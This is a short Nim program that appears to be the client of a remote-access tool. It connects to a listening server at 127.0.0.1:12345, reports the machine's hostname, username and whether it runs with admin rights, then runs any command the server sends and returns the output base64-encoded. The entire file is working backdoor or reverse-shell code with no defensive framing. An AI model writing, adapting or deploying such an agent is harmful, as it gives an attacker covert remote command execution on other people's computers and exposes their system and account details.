import net, strformat, strutils, osproc, os, base64

import modules

let client: Socket = newSocket()
client.connect("127.0.0.1", Port(12345))
stdout.writeLine("Client: connected to server on address 127.0.0.1:12345")

proc receiveCommands(client: Socket) =
    client.send("connect\r\n")
    while true:
        let line = client.recvLine()
        
        let args = line.split(":")
        let cmd = args[0]
        let argsn = len(args)

        if line.len == 0:
            echo "server down"
            quit(0)
        
        case cmd:
        of "hi":
            client.send(&"INFO:{hostname()}:{username()}:{areWeAdmin()}\r\n")
        of "CMD":
            let toExec = args[1..(argsn - 1)].join(":")
            try:
                var (output, _) = execCmdEx(toExec, workingDir = getCurrentDir())
                client.send(&"OUTPUT:CMD:{encode(output)}\r\n")
            except OSError:
                client.send(&"OUTPUT:CMD:{encode(getCurrentExceptionMsg())}\r\n")

receiveCommands(client)
  
client.close()
